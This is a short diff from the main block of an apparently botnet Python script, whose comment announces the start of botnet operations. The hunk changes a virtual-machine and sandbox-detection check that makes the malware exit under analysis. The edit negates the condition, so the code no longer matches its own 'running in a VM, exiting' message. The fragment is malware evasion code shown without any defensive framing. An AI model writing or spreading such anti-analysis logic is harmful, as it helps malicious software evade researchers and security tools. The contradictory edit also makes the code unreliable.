@@ -1123,7 +1123,7 @@ if __name__ == '__main__':
         # Start the main botnet operations
     # Check if running in a virtual machine or isolated environment
     print("Checking if running in a VM or isolated environment...")
-    if is_virtual_env():
+    if not is_virtual_env():
         print("Running in a VM or isolated environment. Exiting.")
         sys.exit(0)
     main()
